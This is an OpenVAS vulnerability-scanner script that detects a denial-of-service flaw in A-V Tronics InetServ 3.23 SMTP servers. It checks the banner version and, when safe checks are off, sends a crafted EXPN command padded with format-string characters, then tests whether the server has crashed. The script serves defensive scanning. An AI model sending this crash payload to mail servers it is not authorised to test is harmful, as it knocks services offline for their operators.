###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_a_v_tronics_inetserv_45960.nasl 13137 2019-01-18 07:33:34Z cfischer $
#
# A-V Tronics InetServ SMTP Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103040");
  script_version("$Revision: 13137 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-18 08:33:34 +0100 (Fri, 18 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-01-24 13:11:38 +0100 (Mon, 24 Jan 2011)");
  script_bugtraq_id(45960);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("A-V Tronics InetServ SMTP Denial of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("SMTP problems");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_mandatory_keys("smtp/inetserver/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45960");
  script_xref(name:"URL", value:"http://www.avtronics.net/inetserv.php");

  script_tag(name:"summary", value:"InetServ is prone to a denial-of-service vulnerability.");

  script_tag(name:"impact", value:"Exploiting this issue may allow attackers to cause the application to
  crash, resulting in denial-of-service conditions.");

  script_tag(name:"affected", value:"Inetserv 3.23 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("smtp_func.inc");
include("version_func.inc");

port = get_smtp_port(default:25);
banner = get_smtp_banner(port:port);
if(!banner || "InetServer" >!< banner)
  exit(0);

if(safe_checks()) {
  version = eregmatch(pattern:"InetServer \(([0-9.]+)\)", string:banner);
  if(version[1]) {
    if(version_is_equal(version:version[1], test_version:"3.2.3")) {
      report = report_fixed_ver(installed_version:version[1], fixed_version:"WillNotFix");
      security_message(port:port, data:report);
      exit(0);
    }
    exit(99);
  }
  exit(0);
} else {

  soc = smtp_open(port:port, data:smtp_get_helo_from_kb(port:port));
  if(!soc)
    exit(0);

  ex = "EXPN " + crap(data:string("%s"), length:80) + string("\r\n");
  send(socket:soc, data:ex);
  send(socket:soc, data:string("help\r\n"));

  if(!soc1 = smtp_open(port:port, data:NULL)) {
    close(soc);
    security_message(port:port);
    exit(0);
  }
  smtp_close(socket:soc, check_data:FALSE);
  smtp_close(socket:soc1, check_data:FALSE);
  exit(0);
}